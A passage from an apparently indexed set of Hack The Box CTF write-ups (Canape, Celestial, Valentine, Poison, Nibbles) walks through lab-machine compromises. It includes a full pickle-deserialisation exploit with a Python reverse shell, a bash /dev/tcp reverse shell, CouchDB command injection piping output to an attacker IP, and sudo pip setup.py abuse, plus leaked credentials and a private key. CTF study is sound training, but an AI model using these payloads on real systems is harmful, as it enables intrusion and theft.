HERE -Admin\"} If we pay atenttion to the home directory, we'll just find homer user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the ssh one) worked, and seconds later I was able to get the user flag:","title":"User"},{"location":"ctfs/hackthebox/canape/#root","text":"To start, I ran again the LinEnum.sh but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction. In some moment, I thought that the couchdb was running as root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also couchy (look the docs of the password db) was admin. Thanks to this blogpost first, and a little help from this also I was able to successfully execute commands: curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '\"whoami | curl http://10.10.14.255:5555 -d @-\"' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{\"_id\":\"770855a97726d5666d70a22173005c77\"}' --insecure curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json' --insecure Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the whoami wasn't root but homer. I must have confused with some other running process. I continued looking for some interesting thing, but nothing showed up. During that search, I issued: sudo -l And this was the output: ![sudoers][./images/canape/sudoers.png] For those not very familiar, this means that the user homer can run as root the command pip install without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this? PIP is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called setup.py which is the one in charge of really installing the package in your enviroment (virtual env or general env). So my idea was to, download a compressed version of package that already exists (I pick request because is my favourite lib), modify it's code, compress it again and try to install it using sudo: Downloaded the source code from here . Decompressed it. Added the following line to the setup.py: os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p') (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes) * Compressed it again. * Served it in a python serve so you can copy it to the machine . * Executed: sudo /usr/bin/pip install blablabla.tar.gz Read the flag from /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.","title":"Root"},{"location":"ctfs/hackthebox/celestial/","text":"Celestial User After the nmap output we see that there is an open port running express js: Next step was to run dirb against it, while I went to see this page using a web browser. Once we enter with the browser, a CUSTOM page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the set-cookie is present, and the payload seems to be base64. If we refresh the page we will see this output: And if we decode the cookie, we'll have: {\"username\":\"Dummy\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"} So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying Dummy and 2 . So I changed the num for an \"a\" and the following I received the following response: This was great. If you pay attention to the response, you'll see that the error cames from an eval function. So basically this means that they we can execute arbitrary JS code?.. Let's see..: After a couple of tests I realize that the server was doing something like: ... eval(\"num + num\"); ... That's why I appended \"//\" to the final of the payload in order to comment the rest of the line. So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it. Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the Documents directory. Root This part was very straightforward... Once I get the user shell, I start seeing the files that were in the /home/user directory and there was a strange file called output.txt which was own by root, but readeable for everyone. This file just contained the message \" Script is running \". Afterwards, I found a python script in the Documents directory of the user, that just had the following line print \"Script is running...\" The output.txt was being written each 5 minutes. So quickly I understood that this script was being executed by the root user and the output was written to this txt file. So, why I did was to edit the script and add the following lines: content = open(\"/root/root.txt\",\"r\").read() print content After 5 minutes (or less) the output was written again, and the content was the flag:","title":"Celestial"},{"location":"ctfs/hackthebox/celestial/#celestial","text":"","title":"Celestial"},{"location":"ctfs/hackthebox/celestial/#user","text":"After the nmap output we see that there is an open port running express js: Next step was to run dirb against it, while I went to see this page using a web browser. Once we enter with the browser, a CUSTOM page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the set-cookie is present, and the payload seems to be base64. If we refresh the page we will see this output: And if we decode the cookie, we'll have: {\"username\":\"Dummy\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"} So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying Dummy and 2 . So I changed the num for an \"a\" and the following I received the following response: This was great. If you pay attention to the response, you'll see that the error cames from an eval function. So basically this means that they we can execute arbitrary JS code?.. Let's see..: After a couple of tests I realize that the server was doing something like: ... eval(\"num + num\"); ... That's why I appended \"//\" to the final of the payload in order to comment the rest of the line. So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it. Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the Documents directory.","title":"User"},{"location":"ctfs/hackthebox/celestial/#root","text":"This part was very straightforward... Once I get the user shell, I start seeing the files that were in the /home/user directory and there was a strange file called output.txt which was own by root, but readeable for everyone. This file just contained the message \" Script is running \". Afterwards, I found a python script in the Documents directory of the user, that just had the following line print \"Script is running...\" The output.txt was being written each 5 minutes. So quickly I understood that this script was being executed by the root user and the output was written to this txt file. So, why I did was to edit the script and add the following lines: content = open(\"/root/root.txt\",\"r\").read() print content After 5 minutes (or less) the output was written again, and the content was the flag:","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/","text":"Hack The box Solving the First challenge (Registration) In order to join to the platform, you should solve the first challenge. Once in the JOIN section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: /js/inviteapi.min.js . After openning and formating it: eval( function (p,a,c,k,e,d){ e = function(c){return c.toString(36)}; if ( !''.replace(/^/,String)){ while(c--){ d[c.toString(a)] = k[c] || c.toString(a) } k = [function(e){return d[e]}]; e = function(){return'\\\\w+'}; c = 1 }; while(c--){ if (k[c]){ p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]) } } return p } ('1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {} ) ) So basically, it's a JS functiont that it's being called with some specific parameters. It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy & paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters: The answer gathered is again JS code: function verifyInviteCode(code){ var formData = {\"code\":code}; $.ajax({ type:\"POST\", dataType:\"json\", data:formData,url:'/api/invite/verify', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } function makeInviteCode(){ $.ajax({ type:\"POST\", dataType:\"json\", url:'/api/invite/how/to/generate', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } This time seems to show us how the InviteCode related functions are invoked... Time to use burp : Issuing the following POST we will receive an answer with some information encoded: POST /api/invite/how/to/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"data\":\"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\",\"enctype\":\"BASE64\"},\"0\":200} After decoding the value inside data which is encoded with the encoding mentioned in enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate So, let folow their order: POST /api/invite/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"code\":\"WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\",\"format\":\"encoded\"},\"0\":200} And here it is.. Our code is encoded in base64. Once decoded you'll get your code: XIKAY-XYEZO-NJZLJ-USEAS-ZBALN (in my case). Disclaimer I did the challenge again for the write up because I forgot to do it the first time. This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN. Bashed (User) User This machine was pretty easy. First of all I used dirb to start listing some common directories. dirb http://10.10.10.68 common.txt Some directories were found: The dev seemed to be the most interesting one, therefore I started from there: And once inside phpbash.php : Root TBD Valentine (User & root) User So, in order to start, as always, I used nmap : SSH , HTTP , HTTPS . Let's navigate the web servers while we wait for dirb again. The index of both webservers is an image of a woman like shouting and the logo of heartbleed : From last machine I learn that inside /dev/ something could appear. Let's try...: Well, that was lucky. Inside the notes.txt there isn't anything interesting, but inside hype_key , there is some encoded text. Seems to be printable hex, so let's try to decode it: hex to ascii -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- Nice! We have a private key... but what for? Maybe to login by ssh ? We still need the passphrase for it... I was expecting that dirb helped me with the output, but .. unfortunately, it didn't helped me. There were some php scrips that seemed to encode/decode base64, but nothing else (well, it has the /dev directory): Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there? To perform this part I used Metasploit because it already had a module to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples: After analzing these samples, I found a very interesting thing. There was an HTTP request there: It was using one the .php scripts that we found thanks to dirb , which was decode.php .. Let's try to decode it: YEAH! seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase? In order to ensure it, I issued the following command ssh-keygen -y -f rsa_key.pem with rsa_key.pem being the private RSA key. This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase heartbleedbelievethehype the public key was successfully created. So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via SSH . But still, we don't know the user. I spent a LOOOONGG time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that valentine had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one... I spent lot of time trying to find the correct user: Looking on new samples of memory gathered by exploiting heartbleed. Looking in the page source code of the pages hosted in the HTTP Server. Trying with common users (guest, www-data, etc). Among others. Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called hype_key . So I literally ran to type the following command, which fortunately gave me access to the machine. ssh -v -i rsa_key.pem hype@10.10.10.79 Once inside, it was just needed to go to the home directory of this user, and find the user.txt file with the hash inside. Root I copied the LinEnum.sh file to the vm, and made a scan but the path finally wasn't that one. I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command: uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on perf_swevent_init and other two related to dity cow . Unfortunately, there didn't work (don't know why, specially the latest). Finally, I found some video explaining how to use a variant of dirty cow to modify the /etc/passwd/ file in order to create a new user with id 0 (root privileges). Exploit The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set. Poison (User & root) User So, started with the usual nmap command: We have a lot of things to attack. Let's start with the http. First page ask you to choose one script.. Let's took listfiles.php ... The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called pwdbackup.txt . I'd like to read it.. so.. what happens if we change the file param of the url? Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script: import base64 password = \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\" for _ in xrange(13): password = base64.decodestring(password) print password Once executed.. the answer is: Charix!2#4%6&8(0 . Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. What if we use again the path traversal vuln?: Perfect. There is a user called charix , due to the password has also that string, I guess is the correct user for our password. Let's try an ssh connection: Root Ok, once I started using LinEnum.sh , looking for filesystem files, doing enumeration basically. The first thing, is the secret.zip file which is placed in the home of charix. I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. Then, I continued enumerating and discovered some processes running as root listeining only in localhost: In particular, Xvnc and sendmail sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. So I looked for some commands in the machine (just pressing vnc ) and found vncpasswd . Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following: So, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was one . After using it, get the password VNCP@$$! . This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways. At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command: ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84 Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: YEAH! I had to copy it char by char xD. Nibbles (User & Rooted) User Reading comments. Found <!-- /nibbleblog/ directory. Nothing interesting here! --> Ran dirbuster against http://10.10.10.75/nibbleblog/ Found admin.php . Tried with some default credentials: admin:admin nibbles:nibbles admin:nibbles (GOT IT!) Tried to look for a LFI in some upload of images (new page, new post) without luck.. Search in google for nibbleblog: It is a well-known CMS! .. Looking for exploit: YEAH! INside MSF . Run the exploit: Once with the meterpreter. cat /etc/passsd Showed me, that there was only one user interesting called nibbler . whoami returned also nibbler . Went to /home/nibbler and...: Root So, first step was to create a reverse shell.. In order to do that I did: On my local machine sudo ufw allow 3333 nc -lnvp 3333 On the remote machine bash -i bash -i >& /dev/tcp/IP/3333 0>&1 Once I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this video ). So next step was use the LinEnum.sh . I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way). Once I ran it, one of the outputs was: User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh [+] Possible sudo pwnage! -rwxrwxrwx 1 nibbler nibbler 21 May 1 19:01 /home/nibbler/personal/stuff/monitor.sh This basicall means that there is a misconfiguration in the /etc/sudoers file which allows the user nibbler to execute any monitor.sh as root, without prompting any password. So my next step was simply: echo \"cat /root/root.txt\" > /home/nibbler/personal/stuff/monitor.sh sudo /home/nibbler/personal/stuff/monitor.sh It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works The output was the flag =): Celestial (User & Rooted) User After the nmap output we see that there is an open port running express js: Next step was to run dirb against it, while I went to see this page using a web browser. Once we enter with the browser, a CUSTOM page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the set-cookie is present, and the payload seems to be base64. If we refresh the page we will see this output: And if we decode the cookie, we'll have: {\"username\":\"Dummy\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"} So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying Dummy and 2 . So I changed the num for an \"a\" and the following I received the following response: This was great. If you pay attention to the response, you'll see that the error cames from an eval function. So basically this means that they we can execute arbitrary JS code?.. Let's see..: After a couple of tests I realize that the server was doing something like: ... eval(\"num + num\"); ... That's why I appended \"//\" to the final of the payload in order to comment the rest of the line. So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it. Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the Documents directory. Root This part was very straightforward... Once I get the user shell, I start seeing the files that were in the /home/user directory and there was a strange file called output.txt which was own by root, but readeable for everyone. This file just contained the message \" Script is running \". Afterwards, I found a python script in the Documents directory of the user, that just had the following line print \"Script is running...\" The output.txt was being written each 5 minutes. So quickly I understood that this script was being executed by the root user and the output was written to this txt file. So, why I did was to edit the script and add the following lines: content = open(\"/root/root.txt\",\"r\").read() print content After 5 minutes (or less) the output was written again, and the content was the flag: Canape (User & root) User This was my favorite machine so far. Thanks: @overcast!. So, as always, lets start with nmap: $> nmap -sC -sV 10.10.10.70 > nmap And here is the output: Great, while we go to the HTTP server, I'll let an nmap full scan running.. Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet.. Looking to the source code of the main page, we find this: Ok.. Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck. Then, I realized that the nmap has discovered a .git directory, so I proceed to download it: $> wget --recursive --no-parent http://10.10.10.70/.git/ Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application. Just in a few words, this application had to main entrypoints: submit : Where you can submit your quote, and it will stored using Pickle . check : Where it will load the content of your quote as a Pickle and show it back to you. I searched for some tutorials of how to exploit this and fortunately I found a couple of them. So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working. I started to go back on my steps, and figured it out something crucial. The submit endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: ... p_id = base64.b64encode(char + quote)[:10] ... Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash of the concatenation: git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1 - p_id = base64.b64encode(char + quote)[:10] + p_id = md5(char + quote).hexdigest() So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. This was final version of the python application: import string import random import base64 import cPickle from flask import Flask, render_template, request from hashlib import md5 app = Flask(__name__) @app.errorhandler(404) def page_not_found(e): if random.randrange(0, 2) > 0: return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250))) else: return render_template(\"index.html\") @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/quotes\") def quotes(): quotes = [] for id in db: quotes.append({\"title\": db[id][\"character\"], \"text\": db[id][\"quote\"]}) return render_template('quotes.html', entries=quotes) WHITELIST = [ \"homer\", \"marge\", \"bart\", \"lisa\", \"maggie\", \"moe\", \"carl\", \"krusty\" ] @app.route(\"/submit\", methods=[\"GET\", \"POST\"]) def submit(): error = None success = None if request.method == \"POST\": try: char = request.form[\"character\"] quote = request.form[\"quote\"] print \"Char: {}]\\nQuote:{}\".format(char,quote) if not char or not quote: error = True elif not any(c.lower() in char.lower() for c in WHITELIST): error = True else: # TODO - Pickle into dictionary instead, `check` is ready #p_id = base64.b64encode(char + quote)[:10] p_id = md5(char + quote).hexdigest() outfile = open(\"/tmp/\" + p_id + \".p\", \"wb\") outfile.write(char + quote) outfile.close() success = True except Exception as ex: error = True if error: return \"<html><p1>error</p1></html>\" else: return \"<html><p1>success</p1></html>\" #return \"render_template(\"submit.html\", error=error, success=success) @app.route(\"/check\", methods=[\"POST\"]) def check(): print request.form[\"id\"] path = \"/tmp/\" + request.form[\"id\"] + \".p\" data = open(path, \"rb\").read() if \"p1\" in data: item = cPickle.loads(data) else: item = data print item return \"Still reviewing: \" + item if __name__ == \"__main__\": app.run(host=\"0.0.0.0\") (it may be a little modified, but the core parts are there.) So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: import requests #import base64 from hashlib import md5 PATH_REMOTE = \"http://10.10.10.70/{}\" PATH_LOCAL = \"http://192.168.0.15:5000/{}\" REMOTE = True def submit_exploit(cmd): action = 'submit' char = \"S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n\".format(cmd=cmd) quote = '.' payload = \"character={char}&quote={quote}\".format(char=char,quote=quote) headers = {'Content-type': 'application/x-www-form-urlencoded'} path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) print payload r = requests.post(path, data=payload, headers=headers) if r.status_code == 200 and (\"thank you for your suggestion\" in r.text.lower() or 'success' in r.text.lower()): print \"[+] Payload successfully sent. Command: {cmd}\".format(cmd=cmd) #return base64.encodestring(char+quote)[:10] return md5(char+quote).hexdigest() else: print \"[-] Error sending payload\" raise Exception(\"Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) def check_and_run_exploit(id_code): action = 'check' headers = {'Content-type': 'application/x-www-form-urlencoded'} payload = \"id={id_code}\".format(id_code=id_code) path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) r = requests.post(path, data=payload, headers=headers) if r.status_code == 200: print \"[+] Exploit successfully executed\" return r.text else: print \"[-] Error executing exploit\" raise Exception(\"Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) if __name__ == \"__main__\": cmd = \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.255\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\" id_code = submit_exploit(cmd) check_and_run_exploit(id_code) Two disclaimers: The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail). The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one. After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc). Although, we have a reverse shell, the user running the HTTP server is www-data , so we need to escalate privileges and log in as other user. Once inside the machine, my first move was to run LinEnum.sh . Once of the outputs of it was the following: I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a BIG troll. Analyzing the applications running on the system and its ports, I found the couchdb running in localhost. I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: $> curl -X GET http://localhost:5984 {\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}} I started playing around a little more and figured it out how to list dbs and docs inside them: $> curl -X GET http://localhost:5984/_all_dbs [\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"] $> curl -X GET http://localhost:5984/simpsons/_all_docs {\"total_rows\":7,\"offset\":0,\"rows\":[ {\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}}, {\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}}, {\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}}, {\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}}, {\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}}, 